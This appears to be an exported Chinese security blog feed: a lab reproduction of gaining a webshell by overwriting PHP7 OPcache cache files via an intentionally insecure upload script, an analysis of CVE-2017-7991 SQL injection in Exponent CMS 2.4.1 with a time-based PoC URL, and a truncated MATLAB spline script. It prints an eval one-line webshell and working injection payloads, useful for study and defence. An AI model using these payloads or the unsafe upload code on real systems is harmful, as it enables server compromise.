<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170513/tree.jpg" alt=""><br>这个<code>index.php.bin</code> 就是 <code>index.php</code> 的缓存文件。并且作为<code>www-data</code>用户，我们对 <code>5672f68788bcb25b11403b33f5d1497f</code> 具有读写执行权限。这样，我们想办法把这个<code>index.php.bin</code>替换为包含有恶意代码的<code>index.php.bin</code>文件，当我们再次去访问<code>index.php</code>时，php会选择加载这个缓存文件，从而我们达到了getshell的目的。这个思路，感觉跟二进制漏洞中的GOT覆写技术有点神似吧。</p>
<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><h2 id="php版本"><a href="#php版本" class="headerlink" title="php版本"></a>php版本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">root@4db5ba2ab3bf:/var/www/html# php -v</div><div class="line">PHP 7.0.15-0ubuntu0.16.04.4 (cli) ( NTS )</div><div class="line">Copyright (c) 1997-2017 The PHP Group</div><div class="line">Zend Engine v3.0.0, Copyright (c) 1998-2017 Zend Technologies</div><div class="line">    with Zend OPcache v7.0.15-0ubuntu0.16.04.4, Copyright (c) 1999-2017, by Zend Technologies</div></pre></td></tr></table></figure>
<h2 id="配置OPcache"><a href="#配置OPcache" class="headerlink" title="配置OPcache"></a>配置OPcache</h2><h3 id="开启OPcache"><a href="#开启OPcache" class="headerlink" title="开启OPcache"></a>开启OPcache</h3><p>在php配置文件 <code>php.ini</code> 的约莫 1745 行左右，找到如下配置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">;opcache.enable=0</div></pre></td></tr></table></figure></p>
<p>去掉前面的分号<code>;</code>，将<code>0</code>改为<code>1</code>，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">opcache.enable=1</div></pre></td></tr></table></figure></p>
<h3 id="关闭时间戳验证"><a href="#关闭时间戳验证" class="headerlink" title="关闭时间戳验证"></a>关闭时间戳验证</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">;opcache.validate_timestamps=1</div></pre></td></tr></table></figure>
<p>修改为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">opcache.validate_timestamps=0</div></pre></td></tr></table></figure></p>
<h3 id="设置OPcache缓存路径"><a href="#设置OPcache缓存路径" class="headerlink" title="设置OPcache缓存路径"></a>设置OPcache缓存路径</h3><p>继续向下翻，找到如下配置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">;opcache.file_cache=</div></pre></td></tr></table></figure></p>
<p>这里我修改后的配置是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">opcache.file_cache= &quot;/var/www/html/opcache&quot;</div></pre></td></tr></table></figure></p>
<h3 id="设置缓存文件优先级"><a href="#设置缓存文件优先级" class="headerlink" title="设置缓存文件优先级"></a>设置缓存文件优先级</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">;opcache.file_cache_only=0</div></pre></td></tr></table></figure>
<p>修改为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">opcache.file_cache_only=1</div></pre></td></tr></table></figure></p>
<h3 id="重启apache"><a href="#重启apache" class="headerlink" title="重启apache"></a>重启apache</h3><p>这里我以apache作为web服务器。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">service apache2 resart</div></pre></td></tr></table></figure></p>
<p>重启，使前面修改的<code>php.ini</code>生效</p>
<h2 id="www目录"><a href="#www目录" class="headerlink" title="www目录"></a>www目录</h2><h3 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">    &lt;body&gt;</div><div class="line">    	&lt;form action=<span class="string">"upload-file.php"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</div><div class="line">    		&lt;label <span class="keyword">for</span>=<span class="string">"file"</span>&gt;filename:&lt;/label&gt;</div><div class="line">    		&lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span> id=<span class="string">"file"</span> /&gt;</div><div class="line">    		&lt;br/&gt;</div><div class="line">        	&lt;label <span class="keyword">for</span>=<span class="string">"filepath"</span>&gt;filepath:&lt;/label&gt;</div><div class="line">    		&lt;input type=<span class="string">"text"</span> name=<span class="string">"filepath"</span> id=<span class="string">"filepath"</span> /&gt;</div><div class="line">        	&lt;br/&gt;</div><div class="line">    		&lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"submit"</span> /&gt;</div><div class="line">    	&lt;/form&gt;</div><div class="line">    &lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<h3 id="upload-file-php"><a href="#upload-file-php" class="headerlink" title="upload-file.php"></a>upload-file.php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	$path = $_POST[<span class="string">'filepath'</span>];</div><div class="line">    <span class="keyword">echo</span> <span class="string">"filename: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">"&lt;br /&gt;"</span>;  </div><div class="line">    <span class="keyword">echo</span> <span class="string">"type: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] . <span class="string">"&lt;br /&gt;"</span>;  </div><div class="line">    <span class="keyword">echo</span> <span class="string">"size: "</span> . ($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] / <span class="number">1024</span>) . <span class="string">" Kb&lt;br /&gt;"</span>;   </div><div class="line">    move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],  $path . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);  </div><div class="line">    <span class="keyword">echo</span> <span class="string">"save : "</span> . $path . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];    </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>那个。。代码写得很丑。。仅为测试之用：）</p>
<h3 id="phpinfo-php"><a href="#phpinfo-php" class="headerlink" title="phpinfo.php"></a>phpinfo.php</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    phpinfo();</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h1 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h1><p>现在开始黑盒测试。。</p>
<h2 id="利用phpinfo获取信息"><a href="#利用phpinfo获取信息" class="headerlink" title="利用phpinfo获取信息"></a>利用phpinfo获取信息</h2><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170513/opcachefilecache.jpg?raw=true" alt=""></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170513/opcachetimestamp.jpg?raw=true" alt=""><br>可知，OPcache缓存路径在 <code>/var/www/html/opcache</code> 中。且服务器端开启了 <code>opcache.file_cache_only</code>,禁用了<code>opcache.validate_timestamps</code>。 这是能成功利用的条件。</p>
<h2 id="php7-opcache-override-py"><a href="#php7-opcache-override-py" class="headerlink" title="php7-opcache-override.py"></a>php7-opcache-override.py</h2><p>由前可知，在对缓存文件进行操作前，需要经过一个名称是md5哈希值的文件夹。这可以通过 <a href="https://github.com/GoSecure/php7-opcache-override" target="_blank" rel="external">hp7-opcache-override.py</a> 来计算。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170513/systemid.jpg" alt=""></p>
<p>得到这个文件夹名为：5672f68788bcb25b11403b33f5d1497f</p>
<h2 id="构建恶意的缓存文件"><a href="#构建恶意的缓存文件" class="headerlink" title="构建恶意的缓存文件"></a>构建恶意的缓存文件</h2><p>恶意的缓存文件得先本地生成，然后通过各种方式比如上传等去覆盖服务器上的缓存文件。我们先在本地配置好OPcache，这样才能生成缓存文件。然后本地新建一个 <code>index.php</code>,内容是一句话木马<code>&lt;?php @eval($_POST[test]);?&gt;</code>，之后访问它。在对应的缓存文件夹里可以看到<code>index.php.bin</code><br><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170513/local.jpg?raw=true" alt=""><br>用十六进制编辑器打开，将<code>OPCACHE.</code>后的那串md5哈希值，替换为前一步骤得到的哈希值：5672f68788bcb25b11403b33f5d1497f ,修改后如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170513/bin2.jpg" alt=""></p>
<h2 id="覆盖原缓存文件"><a href="#覆盖原缓存文件" class="headerlink" title="覆盖原缓存文件"></a>覆盖原缓存文件</h2><p>在覆盖之前，先看看服务器上的原缓存文件长啥样：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170513/beforeupload.jpg?raw=true" alt=""></p>
<p>这里利用上传来进行覆盖。访问<code>index.php</code>,选择修改后的<code>index.php.bin</code>进行上传，上传路径为要覆盖的缓存文件的相对地址 <code>opcache/5672f68788bcb25b11403b33f5d1497f/var/www/html/</code>。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170513/upload.jpg?raw=true" alt=""></p>
<p>上传完成后，服务器上的缓存文件已经替换成我们构造的恶意文件了。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170513/afterupload.jpg?raw=true" alt=""></p>
<h2 id="菜刀连上"><a href="#菜刀连上" class="headerlink" title="菜刀连上"></a>菜刀连上</h2><p>此时再去访问 <code>index.php</code>,发现已经被修改了，不再是上传的页面。用菜刀连上，密码是 test 。成功getshell。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170513/webshell.jpg?raw=true" alt=""></p>
<h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><p>前面我们是通过上传来实现覆盖，但实际利用起来肯定没那么简单。利用OPcache来获得webshell的姿势一般都会和其他姿势相结合。比如下面两题CTF题</p>
<h2 id="ASIS-CTF-2016-–-BinaryCloud"><a href="#ASIS-CTF-2016-–-BinaryCloud" class="headerlink" title="ASIS CTF 2016 – BinaryCloud"></a>ASIS CTF 2016 – BinaryCloud</h2><p>这题是通过上传来覆盖，但后端有各种过滤。<br>附上<a href="https://ctf.rip/asis-ctf-2016-binarycloud-web-challenge/" target="_blank" rel="external">writeup</a></p>
<h2 id="ALICTF-2016-homework"><a href="#ALICTF-2016-homework" class="headerlink" title="ALICTF 2016  - homework"></a>ALICTF 2016  - homework</h2><p>这题利用sql注入的dumpfile来实现对缓存文件的覆盖。<br>附上<a href="https://github.com/tothi/ctfs/tree/master/alictf-2016/homework" target="_blank" rel="external">writeup</a></p>
<p><em>（Author:chybeta）</em></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;OPcache扩展在PHP5.5.0版本后中已经绑定了，它可以把PHP脚本预编译的字节码存放到缓存中，从而提高性能，加速访问。同时也可以利用它来进行getshell。&lt;br&gt;本文是对 &lt;a href=&quot;http://blog.gosecure.ca/2016/04/27/binary-webshell-through-opcache-in-php-7/&quot;&gt;《binary-webshell-through-opcache-in-php-7》&lt;/a&gt;一文的测试。&lt;br&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="php" scheme="http://yoursite.com/tags/php/"/>
    
      <category term="OPcache" scheme="http://yoursite.com/tags/OPcache/"/>
    
  </entry>
  
  <entry>
    <title>[CVE-2017-7991]Exponent CMS 2.4.1 SQL Injection分析</title>
    <link href="http://yoursite.com/2017/05/12/CVE-2017-7991-Exponent-CMS-2-4-1-SQL-Injection%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2017/05/12/CVE-2017-7991-Exponent-CMS-2-4-1-SQL-Injection分析/</id>
    <published>2017-05-11T23:42:07.000Z</published>
    <updated>2017-05-12T02:04:44.432Z</updated>
    
    <content type="html"><![CDATA[<p>Exponent CMS是一款开源的CMS，其2.4.1版中存在sql注入<br><a id="more"></a></p>
<h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><p>注入点在 /framework/modules/eaas/controllers/eaasController.php 中。如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">api</span><span class="params">()</span> </span>&#123;</div><div class="line">	<span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;params[<span class="string">'apikey'</span>])) &#123;</div><div class="line">		$_REQUEST[<span class="string">'apikey'</span>] = <span class="keyword">true</span>;  <span class="comment">// set this to force an ajax reply</span></div><div class="line">		$ar = <span class="keyword">new</span> expAjaxReply(<span class="number">550</span>, <span class="string">'Permission Denied'</span>, <span class="string">'You need an API key in order to access Exponent as a Service'</span>, <span class="keyword">null</span>);</div><div class="line">		$ar-&gt;send();  <span class="comment">//FIXME this doesn't seem to work correctly in this scenario</span></div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		$key = expUnserialize(base64_decode(urldecode(<span class="keyword">$this</span>-&gt;params[<span class="string">'apikey'</span>])));</div><div class="line">		$cfg = <span class="keyword">new</span> expConfig($key);</div><div class="line">		<span class="keyword">$this</span>-&gt;config = $cfg-&gt;config;</div><div class="line">		<span class="keyword">if</span>(<span class="keyword">empty</span>($cfg-&gt;id)) &#123;</div><div class="line">			$ar = <span class="keyword">new</span> expAjaxReply(<span class="number">550</span>, <span class="string">'Permission Denied'</span>, <span class="string">'Incorrect API key or Exponent as a Service module configuration missing'</span>, <span class="keyword">null</span>);</div><div class="line">			$ar-&gt;send();</div><div class="line">		&#125; <span class="keyword">else</span> &#123;</div><div class="line">			<span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;params[<span class="string">'get'</span>])) &#123;</div><div class="line">				<span class="keyword">$this</span>-&gt;handleRequest();</div><div class="line">			&#125; <span class="keyword">else</span> &#123;</div><div class="line">				$ar = <span class="keyword">new</span> expAjaxReply(<span class="number">200</span>, <span class="string">'ok'</span>, <span class="string">'Your API key is working, no data requested'</span>, <span class="keyword">null</span>);</div><div class="line">				$ar-&gt;send();</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>api()中，先检测参数<code>apikey</code>　是否为空，若不为空，则进入else分支。在分支中，先对参数<code>apikey</code>进行一次<code>urldecode</code>,接着进行 <code>base64_decode</code>,最后进行一次反序列化<code>expUnserialize</code>，在<code>expUnserialize</code>中存在一次小小的过滤：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">expUnserialize</span><span class="params">($serial_str)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span> ($serial_str === <span class="string">'Array'</span>) <span class="keyword">return</span> <span class="keyword">null</span>;  <span class="comment">// empty array string??</span></div><div class="line">    <span class="keyword">if</span> (is_array($serial_str) || is_object($serial_str)) <span class="keyword">return</span> $serial_str;  <span class="comment">// already unserialized</span></div><div class="line"><span class="comment">//    $out1 = @preg_replace('!s:(\d+):"(.*?)";!se', "'s:'.strlen('$2').':\"$2\";'", $serial_str );</span></div><div class="line">    $out = preg_replace_callback(</div><div class="line">        <span class="string">'!s:(\d+):"(.*?)";!s'</span>,</div><div class="line">        create_function (<span class="string">'$m'</span>,</div><div class="line">            <span class="string">'$m_new = str_replace(\'"\',\'\"\',$m[2]);</span></div><div class="line">            return "s:".strlen($m_new).\':"\'.$m_new.\'";\';'</div><div class="line">        ),</div><div class="line">        $serial_str );</div><div class="line"><span class="comment">//    if ($out1 !== $out) &#123;</span></div><div class="line"><span class="comment">//        eDebug('problem:&lt;br&gt;'.$out.'&lt;br&gt;'.$out1);</span></div><div class="line"><span class="comment">//    &#125;</span></div></pre></td></tr></table></figure></p>
<p>它会把 经过<code>base64_decode</code>后的<code>$apikey</code> 中的双引号加上斜杠。但是对于单引号，它没有进行处理。在进行<code>expUnserialize</code>之后，赋值给<code>$key</code>，并在之后实例化一个 <code>expConfig</code>对象。<code>expConfig</code>部分代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">expConfig</span> <span class="keyword">extends</span> <span class="title">expRecord</span> </span>&#123;</div><div class="line">	<span class="keyword">protected</span> $table = <span class="string">'expConfigs'</span>;</div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($params=null)</span> </span>&#123;</div><div class="line">		<span class="keyword">global</span> $db;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (!is_array($params)) &#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;location_data = serialize($params);</div><div class="line">            <span class="keyword">parent</span>::__construct($db-&gt;selectValue(<span class="keyword">$this</span>-&gt;table, <span class="string">'id'</span>, <span class="string">"location_data='"</span>.<span class="keyword">$this</span>-&gt;location_data.<span class="string">"'"</span>));</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="keyword">parent</span>::__construct($params);</div><div class="line">        &#125;</div><div class="line">	....</div></pre></td></tr></table></figure>
<p>在 framysqli\core\subsystems\database\mysqli.php 中，可以看到关于<code>selectValue</code>的定义：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">selectValue</span><span class="params">($table, $col, $where=null)</span> </span>&#123;</div><div class="line">	<span class="keyword">if</span> ($where == <span class="keyword">null</span>)</div><div class="line">		$where = <span class="string">"1"</span>;</div><div class="line">	$sql = <span class="string">"SELECT "</span> . $col . <span class="string">" FROM `"</span> . <span class="keyword">$this</span>-&gt;prefix . <span class="string">"$table` WHERE $where LIMIT 0,1"</span>;</div><div class="line">	$res = @mysqli_query(<span class="keyword">$this</span>-&gt;connection, $sql);</div><div class="line"></div><div class="line">	<span class="keyword">if</span> ($res == <span class="keyword">null</span>)</div><div class="line">		<span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">	$obj = mysqli_fetch_object($res);</div><div class="line">	<span class="keyword">if</span> (is_object($obj)) &#123;</div><div class="line">		<span class="keyword">return</span> $obj-&gt;$col;</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		<span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>可以看到，在检查完<code>$params</code>是否是数组后，将我们传入的<code>$params</code>序列化后直接插入到了数据库查询语句中,未作任何过滤和检测。加上之前并未对单引号进行处理，因此我们可以利用单引号，对 <code>location_data=&#39;&quot;.$this-&gt;location_data.&quot;&#39;</code> 中的单引号进行闭合。</p>
<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">http://localhost:2500/exponent241/index.php</div><div class="line">?module=eaas</div><div class="line">&amp;action=api</div><div class="line">&amp;apikey=czoxNjoiYWFhJ29yIHNsZWVwKDIpIyI7</div></pre></td></tr></table></figure>
<p>其中 base64_decode(“czoxNjoiYWFhJ29yIHNsZWVwKDIpIyI7”) = s:16:”aaa’or “‘sleep(2)#</p>
<p>查看 mysql.log ，可以发现成功注入。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170512/sqlinject/1.jpg?raw=true" alt=""><br>运行的 sql语句 为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT id FROM `exponent_expConfigs` WHERE location_data=&apos;s:19:&quot;aaa&apos;or \&quot;&apos;sleep(2)#&quot;;&apos; LIMIT 0,1</div></pre></td></tr></table></figure>
<p>可以看到单引号被成功闭合。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Exponent CMS是一款开源的CMS，其2.4.1版中存在sql注入&lt;br&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="漏洞分析" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>三次样条插值之MATLAB实现</title>
    <link href="http://yoursite.com/2017/04/09/%E4%B8%89%E6%AC%A1%E6%A0%B7%E6%9D%A1%E6%8F%92%E5%80%BC%E4%B9%8BMATLAB%E5%AE%9E%E7%8E%B0/"/>
    <id>http://yoursite.com/2017/04/09/三次样条插值之MATLAB实现/</id>
    <published>2017-04-09T15:15:05.000Z</published>
    <updated>2017-04-09T15:23:32.376Z</updated>
    
    <content type="html"><![CDATA[<p>三次样条插值之MATLAB实现<br><a id="more"></a></p>
<h1 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h1><figure class="highlight matlab"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div></pre></td><td class="code"><pre><div class="line">clear all</div><div class="line">x = input(<span class="string">'输入横坐标，格式:[x1 x2 …… xn]\n'</span>)</div><div class="line">y = input(<span class="string">'输入纵坐标，格式:[y1 y2 …… yn]\n'</span>)</div><div class="line">n = <span class="built_in">length</span>(x);</div><div class="line"></div><div class="line">flag = input(<span class="string">'请选择边界条件：①已知两端一阶导数值，②已知两端二阶导数值。选择 1 or 2 :'</span>);</div><div class="line"><span class="keyword">if</span> flag == <span class="number">1</span></div><div class="line">    y1_deri = input(<span class="string">'x1 的 一阶导数值：'</span>);</div><div class="line">    yn_deri = input(<span class="string">'xn 的 一阶导数值：'</span>);</div><div class="line"><span class="keyword">else</span></div><div class="line">    y1_deri = input(<span class="string">'x1 的 二阶导数值：'</span>);</div><div class="line">    yn_deri = input(<span class="string">'xn 的 二阶导数值：'</span>);</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> <span class="built_in">i</span> = <span class="number">1</span> : n<span class="number">-1</span></div><div class="line">    h(<span class="built_in">i</span>) = x(<span class="built_in">i</span>+<span class="number">1</span>) -  x(<span class="built_in">i</span>);</div><div class="line"><span class="keyword">end</span></div><div class="line">fprintf(<span class="string">'计算 h 结果为:\n'</span>);</div><div class="line">h</div><div class="line"></div><div class="line"><span class="keyword">for</span> <span class="built_in">i</span> = <span class="number">2</span> : n<span class="number">-1</span></div><div class="line">    u(<span class="built_in">i</span><span class="number">-1</span>) = h(<span class="built_in">i</span><span class="number">-1</span>) / (h(<span class="built_in">i</span><span class="number">-1</span>) + h(<span class="built_in">i</span>));</div><div class="line">    lamda(<span class="built_in">i</span>) = h(<span class="built_in">i</span>) / (h(<span class="built_in">i</span><span class="number">-1</span>) + h(<span class="built_in">i</span>));</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> flag == <span class="number">1</span></div><div class="line">    u(n<span class="number">-1</span>) = <span class="number">1</span>;</div><div class="line">    lamda(<span class="number">1</span>) = <span class="number">1</span>;</div><div class="line"><span class="keyword">else</span></div><div class="line">    u(n<span class="number">-1</span>) = <span class="number">0</span>;</div><div class="line">    lamda(<span class="number">1</span>) = <span class="number">0</span>;</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">fprintf(<span class="string">'计算 μ 结果为: \n'</span>);</div><div class="line">u</div><div class="line">fprintf(<span class="string">'计算 λ 结果为：\n'</span>);</div><div class="line">lamda</div><div class="line"></div><div class="line"><span class="keyword">for</span> <span class="built_in">i</span> = <span class="number">2</span> : n<span class="number">-1</span></div><div class="line">    d(<span class="built_in">i</span>) = <span class="number">6</span> * ((y(<span class="built_in">i</span>+<span class="number">1</span>)-y(<span class="built_in">i</span>))/(x(<span class="built_in">i</span>+<span class="number">1</span>)-x(<span class="built_in">i</span>)) - (y(<span class="built_in">i</span>) - y(<span class="built_in">i</span><span class="number">-1</span>))/( x(<span class="built_in">i</span>) - x(<span class="built_in">i</span><span class="number">-1</span>)))/(h(<span class="built_in">i</span><span class="number">-1</span>)+h(<span class="built_in">i</span>));</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> flag == <span class="number">1</span></div><div class="line">    d(<span class="number">1</span>) = <span class="number">6</span> / h(<span class="number">1</span>) * (( y(<span class="number">2</span>)-y(<span class="number">1</span>) )/( x(<span class="number">2</span>) - x(<span class="number">1</span>) ) - y1_deri);</div><div class="line">    d(n) = <span class="number">6</span> / h(n<span class="number">-1</span>) * (yn_deri - ((y(n) - y(n<span class="number">-1</span>)) / ( x(n) - x(n<span class="number">-1</span>))));</div><div class="line"><span class="keyword">else</span></div><div class="line">    d(<span class="number">1</span>) = <span class="number">2</span> * y1_deri;</div><div class="line">    d(n) = <span class="number">2</span> * yn_deri;</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">fprintf(<span class="string">'计算 d 的结果：\n'</span>);</div><div class="line">d</div><div class="line"></div><div class="line">matrix1 = <span class="built_in">zeros</span>(n,n);</div><div class="line"><span class="keyword">for</span> <span class="built_in">i</span> = <span class="number">1</span> : n<span class="number">-1</span></div><div class="line">    matrix1(<span class="built_in">i</span>,<span class="built_in">i</span>) = <span class="number">2</span>;</div><div class="line">    matrix1(<span class="built_in">i</span>,<span class="built_in">i</span>+<span class="number">1</span>) = lamda(<span class="built_in">i</span>);</div><div class="line">    matrix1(<span class="built_in">i</span>+<span class="number">1</span>,<span class="built_in">i</span>) = u(<span class="built_in">i</span>);</div><div class="line"><span class="keyword">end</span></div><div class="line">matrix1(n,n) = <span class="number">2</span>;</div><div class="line">matrix1;</div><div class="line"></div><div class="line">fprintf(<span class="string">'求得 M 结果:\n'</span>);</div><div class="line">M = matrix1\d'</div><div class="line"></div><div class="line"><span class="keyword">for</span> <span class="built_in">i</span> = <span class="number">1</span> : n<span class="number">-1</span></div><div class="line">    clear S</div><div class="line">    syms t</div><div class="line">    k = 